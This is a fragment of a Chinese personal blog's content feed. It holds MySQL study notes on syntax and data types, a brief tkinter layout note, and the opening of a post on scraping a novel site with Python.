<h3 id="HANDLER-语句"><a href="#HANDLER-语句" class="headerlink" title="HANDLER 语句"></a>HANDLER 语句</h3><p>前面使用的 <code>select</code> 语句通常用来返回行的集合，MySQL中还有另外一个可以返回行的语句： <em>handler</em> 语句。它能够一行一行的浏览表中的数据，这不是SQL标准，而是MySQL 的一个扩展，只适用于MyISAM表和InnoDB表。<br>使用该语句时要先打开一个表，然后在读这个表，使用完之后还必须关闭已经打开的表。</p>
<p>  1、打开一个表</p>
<p><strong>语法格式</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler tablename open [ [ as ] 别名 ];    # as用于指定别名</span><br></pre></td></tr></table></figure>
<p>2、 浏览表中的行</p>
<p><strong>语法格式1</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> tablename <span class="keyword">read</span> &#123; <span class="keyword">first</span> | <span class="keyword">next</span> &#125; [<span class="keyword">where</span> 条件] [<span class="keyword">limit</span> ...];</span><br></pre></td></tr></table></figure>
<p>注意：此处的<code>limit</code> 字段用来控制返回的结果语句的行数，默认只有一行。</p>
<p><strong>语法格式2</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> tablename <span class="keyword">read</span> 索引名 &#123;&lt;|&gt;|=|...&#125; (值...)</span><br><span class="line"> [where 条件] [limit ...];     # 以比较运算符为索引读取行</span><br><span class="line"><span class="keyword">handler</span> tablename <span class="keyword">read</span> 索引名 &#123;<span class="keyword">first</span> | <span class="keyword">next</span> | prev | <span class="keyword">last</span> &#125;</span><br><span class="line"> [where 条件] [limit ...];     # 以关键字来读取行</span><br></pre></td></tr></table></figure>
<p> 3、关闭打开的表</p>
<p><strong>语法格式</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> tablename <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure>
<h3 id="视图（view）"><a href="#视图（view）" class="headerlink" title="视图（view）"></a>视图（view）</h3><p>此处只对视图进行简单的介绍。<br>视图是从一个或多个表（视图）中导出（通过查询方式）的表，是一个 <em>虚表</em> ，即数据库中只存储视图的结构不存储具体数据，需要时再在表中进行查询使用。使用方便，安全性高。</p>
<p><strong>语法格式</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span></span><br><span class="line">[<span class="keyword">or</span> <span class="keyword">replace</span>] # 用<span class="keyword">replace</span>能替代同名视图</span><br><span class="line">[definer = &#123;<span class="keyword">user</span>|<span class="keyword">current_user</span>&#125;]</span><br><span class="line"><span class="keyword">view</span> 视图名 [(列名 ...)]</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">select</span> 语句</span><br><span class="line">[<span class="keyword">with</span> [<span class="keyword">cascaded</span>|<span class="keyword">local</span>] <span class="keyword">check</span> <span class="keyword">option</span>]</span><br></pre></td></tr></table></figure>
<p>执行查询、修改、删除等操作时与对表的操作类似。</p>
]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL学习笔记(二)]]></title>
      <url>/2018/01/07/mysql2/</url>
      <content type="html"><![CDATA[<p>Mysql数据库的增删查改<br><a id="more"></a></p>
<h3 id="MYSQL基本命令"><a href="#MYSQL基本命令" class="headerlink" title="MYSQL基本命令"></a>MYSQL基本命令</h3><div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>show variables like ‘char%’;</td>
<td>显示系统中带有char字符的系统参数</td>
<td></td>
</tr>
<tr>
<td>set character_set_client gbk;</td>
<td>设置客户端编码方式为GBK</td>
<td></td>
</tr>
<tr>
<td>status;</td>
<td>显示当前系统信息</td>
<td></td>
</tr>
<tr>
<td>delimiter $$</td>
<td>修改命令结束符号为$$</td>
<td>想要恢复；作为结束符使用 opdelimiter ;</td>
</tr>
</tbody>
</table>
</div>
<hr>
<h3 id="数据库语句"><a href="#数据库语句" class="headerlink" title="数据库语句"></a>数据库语句</h3><p><strong>创建数据库</strong><br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> [<span class="keyword">database</span>|<span class="keyword">schema</span>] [<span class="keyword">if</span> <span class="keyword">not</span> existe] databasename</span><br><span class="line">[options ...]</span><br></pre></td></tr></table></figure></p>
<hr>
<p><strong>修改数据库</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> [<span class="keyword">DATABASE</span>|<span class="keyword">SCHEMA</span>] [DATABASENAME]</span><br><span class="line">	<span class="keyword">OPTION</span> ...</span><br></pre></td></tr></table></figure></p>
<p>此命令用于修改数据库的全局特性，这些特性存在db.opt文件中，如果语句中忽略数据库名，则会修改当前数据库<br>示例代码<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter database xscj</span><br><span class="line">default charcter <span class="builtin-name">set</span> gb2312;</span><br></pre></td></tr></table></figure></p>
<p><strong>删除数据库</strong><br>DROP DATABASE DATABASENAME</p>
<hr>
<h3 id="表结构操作语句"><a href="#表结构操作语句" class="headerlink" title="表结构操作语句"></a>表结构操作语句</h3><h4 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> [temporary] table [<span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span>] <span class="keyword">user</span>(</span><br><span class="line">	id int auto_increment <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">primary</span> <span class="keyword">key</span>,</span><br><span class="line">	username varchar(<span class="number">10</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);  # 使用ifnot...从句可以不显示错误信息</span><br><span class="line">	# unique key也可以表示字段名唯一</span><br></pre></td></tr></table></figure>
<h4 id="插入语句"><a href="#插入语句" class="headerlink" title="插入语句"></a>插入语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tablename <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'Tom'</span>)  # 字符串串值需要用引号括起来</span><br></pre></td></tr></table></figure>
<h4 id="复制现成的表"><a href="#复制现成的表" class="headerlink" title="复制现成的表"></a>复制现成的表</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> TABLE TABLE_NAME <span class="keyword">LIKE</span> HAVED_TABLE; # 该命令会复制一个与已有表结构相同的空表</span><br><span class="line"><span class="keyword">CREATE</span> TABLE TABLE_NAME <span class="keyword">AS</span> (表达式ex：<span class="keyword">select</span> * <span class="keyword">from</span> haved_table); </span><br><span class="line">	# 该命令是复制表达内容，但是表达式和索引不会复制，只会复制内容部分，例如主键特性就不会被复制</span><br></pre></td></tr></table></figure>
<h4 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h4><h5 id="修改表结构"><a href="#修改表结构" class="headerlink" title="修改表结构"></a>修改表结构</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> [<span class="keyword">IGNORE</span>] <span class="keyword">TABLE</span> table_name</span><br><span class="line">	<span class="keyword">option</span> ...</span><br><span class="line">OPTIOIN:</span><br><span class="line"><span class="keyword">ADD</span> [<span class="keyword">COLUMN</span>] 列定义 [<span class="keyword">FIRST</span>|<span class="keyword">AFTER</span> 列名]			<span class="comment">/*添加列*/</span></span><br><span class="line"><span class="keyword">ALTER</span> [<span class="keyword">COLUMN</span>] 列名 &#123;<span class="keyword">SET</span> <span class="keyword">DEFAULT</span> literal|<span class="keyword">DROP</span> DEAFAULT&#125;			<span class="comment">/*修改默认值*/</span></span><br><span class="line"><span class="keyword">CHANGE</span> [<span class="keyword">COLUMN</span>] 列名 愿列名 [<span class="keyword">FIRST</span>|<span class="keyword">AFTER</span> 列名]				<span class="comment">/*列名重定义*/</span></span><br><span class="line"><span class="keyword">MODIFY</span> [<span class="keyword">COLUMN</span>] 列定义 [<span class="keyword">FIRST</span>|<span class="keyword">AFTER</span> 列名]			<span class="comment">/*修改列数据类型*/</span></span><br><span class="line"><span class="keyword">DROP</span> [<span class="keyword">COLUMN</span>] 列名 				<span class="comment">/*删除列*/</span></span><br><span class="line">RANAME [<span class="keyword">TO</span>] 列表名				<span class="comment">/*重命名该表*/</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名 					<span class="comment">/*排序*/</span></span><br><span class="line"><span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> 字符集名 [<span class="keyword">COLLATE</span> 校对规则名] 		<span class="comment">/*将字符集转换为二进制*/</span></span><br><span class="line">[<span class="keyword">DEFAULT</span>] <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> 字符集名 [<span class="keyword">COLLATE</span> 校对规则名]			<span class="comment">/*修改默认字符集*/</span></span><br></pre></td></tr></table></figure>
<p><strong>示例代码</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.alter table xs add column 性别 bit not null after 姓名;      	# 注意列名不加引号，加了会报错</span><br><span class="line">2.alter table xs change 备注 backup char(10);					# 修改列名，先给出原列名，注意后面必须要加新列名的数据类型</span><br><span class="line">3.alter table xs modify backup char(11);						# 修改列的数据类型，但是如果新的数据类型与所存的数据类型冲突则会错误</span><br></pre></td></tr></table></figure></p>
<p>对于多条命令可以用，号隔开<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> xs</span><br><span class="line">	<span class="keyword">add</span> 年级 tinyint,</span><br><span class="line">	<span class="keyword">drop</span> <span class="keyword">column</span> 姓名;</span><br></pre></td></tr></table></figure></p>
<h5 id="更改表名"><a href="#更改表名" class="headerlink" title="更改表名"></a>更改表名</h5><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RENAME <span class="keyword">TABLE</span> 老表名 TO 新表名										/*多个命令之间用逗号隔开*/</span><br></pre></td></tr></table></figure>
<h4 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> [<span class="keyword">TEMPORARY</span>] <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] 表名</span><br></pre></td></tr></table></figure>
<h4 id="表结构特点"><a href="#表结构特点" class="headerlink" title="表结构特点"></a>表结构特点</h4><p>1.表达空值与数值数据0或者空字符混为一谈，任意两个空值都不相等<br>2.长度小于4的varchar被改变为char<br>3.隐含的改变列类型</p>
<hr>
<h3 id="表记录操作"><a href="#表记录操作" class="headerlink" title="表记录操作"></a>表记录操作</h3><h4 id="插入记录"><a href="#插入记录" class="headerlink" title="插入记录"></a>插入记录</h4><p>4.1 插入新纪录</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> [<span class="keyword">LOW_PRIORITY</span>|<span class="keyword">DELAYED</span>|<span class="keyword">HIGH_PRIORITY</span>] &#123;%<span class="keyword">raw</span>%&#125;[<span class="keyword">IGNORE</span>]&#123;%endraw%&#125;  # <span class="keyword">low</span>,<span class="keyword">delayed</span>等表示该操作的优先级</span><br><span class="line">	[<span class="keyword">INTO</span>] 表名 [(列名,...)]</span><br><span class="line">	<span class="keyword">VALUES</span>(&#123;expr|<span class="keyword">default</span>&#125;,...),(,...),...</span><br><span class="line">	|<span class="keyword">SET</span> 列名=&#123;expr|<span class="keyword">default</span>&#125;,...</span><br><span class="line">    [<span class="keyword">ON</span> <span class="keyword">DUPLICATE</span> <span class="keyword">KEY</span> <span class="keyword">UPDATE</span> 列名=expr,..] # 该语句作用是如果发生<span class="keyword">unique</span> <span class="keyword">key</span>或primary <span class="keyword">key</span>或primary出现重复，则按照该语句指定的列插入</span><br></pre></td></tr></table></figure>
<p>4.2 从已有表中插入新记录</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> [<span class="keyword">LOW_PRIORITY</span>|<span class="keyword">DELAYED</span>|<span class="keyword">HIGH_PRIORITY</span>] &#123;%<span class="keyword">raw</span>%&#125;[<span class="keyword">IGNORE</span>]&#123;%endraw%&#125;</span><br><span class="line">	[<span class="keyword">INTO</span>] 表名 [(列名,...)]</span><br><span class="line">	<span class="keyword">SELECT</span> 语句</span><br><span class="line">	[<span class="keyword">ON</span> <span class="keyword">DUPLICATE</span> <span class="keyword">KEY</span> <span class="keyword">UPDATE</span> 列名=expr,..]</span><br></pre></td></tr></table></figure>
<p>4.3 替换旧记录    REPLACE<br>    语句与insert相同，该语句会在插入之前将与新纪录冲突的旧记录删除，从而插入新数据<br>4.4 插入图片可以插入路径或者直接存储图片本身(使用load_file()函数，参数为图片路径)</p>
<h4 id="修改记录"><a href="#修改记录" class="headerlink" title="修改记录"></a>修改记录</h4><p><strong>4.1 修改单个表</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> [<span class="keyword">LOW_PRIORITY</span>] [<span class="keyword">IGNORE</span>] 表名</span><br><span class="line">	<span class="keyword">SET</span> 列名<span class="number">1</span>=expr1[,列名<span class="number">2</span>=expr2...]</span><br><span class="line">	[<span class="keyword">WHERE</span> 条件]      # 若没有设定，则会更新所有区行</span><br><span class="line">	[<span class="keyword">ORDER</span> <span class="keyword">BY</span>　...]</span><br><span class="line">	[<span class="keyword">LIMIT</span> <span class="keyword">row_count</span>]</span><br></pre></td></tr></table></figure>
<p><strong>4.2 修改多个表</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE [LOW_PRIORITY] [IGNORE] 表名1,表名2,<span class="built_in">..</span>.</span><br><span class="line">	<span class="builtin-name">SET</span> 列名<span class="attribute">1</span>=expr1[,列名<span class="attribute">2</span>=expr2...]</span><br><span class="line">	[WHERE 条件]</span><br></pre></td></tr></table></figure>
<h4 id="删除记录"><a href="#删除记录" class="headerlink" title="删除记录"></a>删除记录</h4><h5 id="4-1单表操作"><a href="#4-1单表操作" class="headerlink" title="4.1单表操作"></a>4.1单表操作</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> [<span class="keyword">low_priority</span>] [<span class="keyword">quick</span>] <span class="keyword">from</span> 表名     # <span class="keyword">quick</span>修饰符可以加快部分删除操作的速度</span><br><span class="line">	[<span class="keyword">where</span> 条件]</span><br><span class="line">	[<span class="keyword">order</span> <span class="keyword">by</span> ...]</span><br><span class="line">	[<span class="keyword">limit</span> <span class="keyword">row_count</span>]</span><br></pre></td></tr></table></figure>
<h5 id="2-多个表中操作"><a href="#2-多个表中操作" class="headerlink" title="2.多个表中操作"></a>2.多个表中操作</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete [<span class="string">low_priority</span>] [<span class="string">quick</span>] [<span class="string">ignore</span>] 表名[<span class="string">.*</span>][<span class="symbol">,表名[.*</span>]...]</span><br><span class="line"><span class="code">	from table_references</span></span><br><span class="line"><span class="code">	[where ]             该语句删除from子句之前的表中的内容</span></span><br></pre></td></tr></table></figure>
<h5 id="或者"><a href="#或者" class="headerlink" title="或者"></a>或者</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> [<span class="keyword">low_priority</span>] [<span class="keyword">quick</span>] [<span class="keyword">ignore</span>]  # 该语句删除<span class="keyword">from</span>子句中的表中的内容</span><br><span class="line">	<span class="keyword">from</span> 表名[.*][,表名[.*]...]</span><br><span class="line">	<span class="keyword">using</span> table_references</span><br><span class="line">	[<span class="keyword">where</span>]</span><br></pre></td></tr></table></figure>
<h5 id="EXAMPE："><a href="#EXAMPE：" class="headerlink" title="EXAMPE："></a>EXAMPE：</h5><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete user1,user2</span><br><span class="line">	<span class="keyword">from</span> user1,user2,user</span><br><span class="line">	<span class="keyword">where</span> user1.<span class="built_in">id</span>=user.<span class="built_in">id</span> <span class="keyword">and</span> user2.<span class="built_in">id</span>=user.<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
<h5 id="清除表数据"><a href="#清除表数据" class="headerlink" title="清除表数据"></a>清除表数据</h5><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate <span class="keyword">table</span> 表名     # 清空表</span><br></pre></td></tr></table></figure>
<h3 id="数据库信息显示"><a href="#数据库信息显示" class="headerlink" title="数据库信息显示"></a>数据库信息显示</h3><p><img src="mysql2/1.jpg" height="600" width="495"></p>
]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL学习笔记(一)]]></title>
      <url>/2018/01/01/Mysqldatatype/</url>
      <content type="html"><![CDATA[<p>MySQL数据类型<br><a id="more"></a></p>
<h3 id="MySQL数据类型"><a href="#MySQL数据类型" class="headerlink" title="MySQL数据类型"></a>MySQL数据类型</h3><pre><code>在MYSQL数据类型主要有文本、数字、时间/日期类型
</code></pre><h4 id="Numbe类型"><a href="#Numbe类型" class="headerlink" title="Numbe类型"></a>Numbe类型</h4><div class="table-container">
<table>
<thead>
<tr>
<th>数据类型</th>
<th>描述      </th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT(size)</td>
<td>-128 到 127 常规。0 到 255 无符号*。在括号中规定最大位数。                                                        </td>
</tr>
<tr>
<td>SMALLINT(size)</td>
<td>-32768 到 32767 常规。0 到 65535 无符号*。在括号中规定最大位数。                                                </td>
</tr>
<tr>
<td>MEDIUMINT(size)</td>
<td>-8388608 到 8388607 普通。0 to 16777215 无符号*。在括号中规定最大位数。                                        </td>
</tr>
<tr>
<td>INT(size)</td>
<td>-2147483648 到 2147483647 常规。0 到 4294967295 无符号*。在括号中规定最大位数。</td>
</tr>
<tr>
<td>BIGINT(size)</td>
<td>-9223372036854775808 到 9223372036854775807 常规。0 到 18446744073709551615 无符号*。在括号中规定最大位数。</td>
</tr>
<tr>
<td>FLOAT(size,d)</td>
<td>带有浮动小数点的小数字。在括号中规定最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td>REAL(length,d)</td>
<td>和FLOAT类型差不多，运算速度快，但是精度有限。</td>
</tr>
<tr>
<td>DOUBLE(size,d)</td>
<td>带有浮动小数点的大数字。在括号中规定最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td>DECIMAL(size,d)</td>
<td>作为字符串存储的 DOUBLE 类型，允许固定的小数点</td>
</tr>
<tr>
<td>BIT[M]</td>
<td>该数据类型在数据库中以1,0的形式存储，因此修改时只能用1,0或者true/false来存储</td>
</tr>
</tbody>
</table>
</div>
<h4 id="Date类型"><a href="#Date类型" class="headerlink" title="Date类型"></a>Date类型</h4><div class="table-container">
<table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>DATE()</td>
<td>日期。格式：YYYY-MM-DD //注释：支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’</td>
</tr>
<tr>
<td>DATETIME()</td>
<td>日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS // 注释：支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>
</tr>
<tr>
<td>TIMESTAMP()</td>
<td>时间戳。TIMESTAMP 值使用 Unix 纪元(‘1970-01-01 00:00:00’ UTC) 至今的描述来存储。格式：YYYY-MM-DD HH:MM:SS // 注释：支持的范围是从 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-09 03:14:07’ UTC</td>
</tr>
<tr>
<td>TIME()</td>
<td>时间。格式：HH:MM:SS 注释：支持的范围是从 ‘-838:59:59’ 到 ‘838:59:59’</td>
</tr>
<tr>
<td>YEAR()</td>
<td>2 位或 4 位格式的年。 // 注释：4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。</td>
</tr>
</tbody>
</table>
</div>
<h4 id="Text类型"><a href="#Text类型" class="headerlink" title="Text类型"></a>Text类型</h4><div class="table-container">
<table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>CHAR(size)</td>
<td>保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符。</td>
</tr>
<tr>
<td>VARCHAR(size)</td>
<td>保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。 // 注释：如果值的长度大于 255，则被转换为 TEXT 类型。</td>
</tr>
<tr>
<td>TINYTEXT</td>
<td>存放最大长度为 255 个字符的字符串。</td>
</tr>
<tr>
<td>TEXT</td>
<td>存放最大长度为 65,535 个字符的字符串。</td>
</tr>
<tr>
<td>BLOB</td>
<td>用于 BLOBs (Binary Large OBjects)。存放最多 65,535 字节的数据。</td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>存放最大长度为 16,777,215 个字符的字符串。</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>用于 BLOBs (Binary Large OBjects)。存放最多 16,777,215 字节的数据。</td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>存放最大长度为 4,294,967,295 个字符的字符串。</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。</td>
</tr>
<tr>
<td>ENUM(x,y,z,etc.)</td>
<td>允许你输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。//注释：这些值是按照你输入的顺序存储的。可以按照此格式输入可能的值：ENUM(‘X’,’Y’,’Z’)</td>
</tr>
<tr>
<td>SET</td>
<td>与 ENUM 类似，SET 最多只能包含 64 个列表项，不过 SET 可存储一个以上的值。</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tkinter]]></title>
      <url>/2017/12/20/tkinter/</url>
      <content type="html"><![CDATA[<p>最近程序设计课我不知道为什么鬼使神差的使用python的tkinter库开发了gui程序，虽然过程很多波折，但是还是学到了不少东西的，特地把一些东西记录一下。<br><a id="more"></a></p>
<p><strong>简单开始</strong><br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from tkinter <span class="keyword">import</span> *</span><br><span class="line">root = Tk()</span><br><span class="line">root.<span class="built_in">title</span>(<span class="string">"start"</span>)</span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure></p>
<p><a href="http://effbot.org/tkinterbook/" target="_blank" rel="noopener">参考文档</a></p>
<hr>
<p>该模块中对于控件的放置支持三种方法<br> pack方法</p>
<blockquote>
<p>pack的放置是基于块的思想来实现的，每一个块放置后系统会自动填充到目标窗体中，可以通过属性来改变其放置的位置，属于tkinter中比较常用的一种方法。注意frame控件属于pack()方法的内容，不能够和其它方法混用。</p>
</blockquote>
<p>常用参数：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">anchor</td>
<td>设置对齐方式，以地理坐标的方式，参数有E,W,N,S(东南西北),EN,ES,WE,WS,W+E+S+N</td>
</tr>
<tr>
<td style="text-align:center">fill</td>
<td>填充方向，可以选择X方向，Y方向，BOTH指两个方向都包含</td>
</tr>
<tr>
<td style="text-align:center">expand</td>
<td>设置是否扩充</td>
</tr>
<tr>
<td style="text-align:center">ipadx</td>
<td>x内边距</td>
</tr>
<tr>
<td style="text-align:center">ipady</td>
<td>y内边距</td>
</tr>
<tr>
<td style="text-align:center">padx</td>
<td>x外边距</td>
</tr>
<tr>
<td style="text-align:center">pady</td>
<td>y外边距</td>
</tr>
<tr>
<td style="text-align:center">side</td>
<td>放置大致方位</td>
</tr>
</tbody>
</table>
</div>
<p>grid方法</p>
<blockquote>
<p>grid方法对于控件的放置是基于表格的形式来放置，但是通过row，column选项可以控制控件的位置，注意row或者column选项值相等的控件会水平或竖直对齐。</p>
</blockquote>
<p>place方法</p>
<blockquote>
<p>该方法通过指定在屏幕上的x，y值来控制控件的位置，可以实现非常精确的控制，但是这种方法编写非常复杂，所以不推荐这种方法。</p>
</blockquote>
<p>注意：这三种方法不能再一个窗口中混用，尤其是pack和grid方法，如果混用会报错。而且会导致控件放置错乱。</p>
<hr>
<p>对于treeview视图，贴个网址，我感觉就应该足够了<br><a href="https://www.jianshu.com/p/6a37d33e96a2" target="_blank" rel="noopener">点我</a></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本来一片雄心想大写特写，然而，理想很丰满，现实很骨感，还是没写多少东西，不过感觉也差不多够用了(#^.^#)。</p>
]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tkinter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Spider攻城记]]></title>
      <url>/2017/12/15/spider1/</url>
      <content type="html"><![CDATA[<p>刚刚起步，先来点东西水一水…<br><a id="more"></a></p>
<h3 id="为什么要干这个呢"><a href="#为什么要干这个呢" class="headerlink" title="为什么要干这个呢"></a>为什么要干这个呢</h3><p>　　最近突然想看《细说隋唐》，但是网上找资源很难找，好不容易找到一个在线阅读网站但是这个网站的页面不能自动适应手机界面，很烦，而且不能自动切换到下一章，每一次都得返回目录页找下一章，而且页面上还有广告QAQ~~…总之不舒服，于是突发奇想做个爬虫（spider）把内容爬下来，然后导入手机观看，这样岂不是很有逼格？！说干就干。<br>　　目标网址<a href="http://www.saohua.com/shuku/xishuosuitang" target="_blank" rel="noopener">Link</a></p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>　　python、掌阅（一款电子书APP）、python包BeautifulSoup4</p>
<h3 id="分析URL"><a href="#分析URL" class="headerlink" title="分析URL"></a>分析URL</h3><p>　　每个具体章节例如第5章http://www.saohua.com/shuku/xishuosuitang/ldf06.htm，发现第i章URL为http://www.saohua.com/shuku/xishuosuitang/ldf<font color="#00ffff" size="3"><strong>i-5</strong></font>.htm</p>
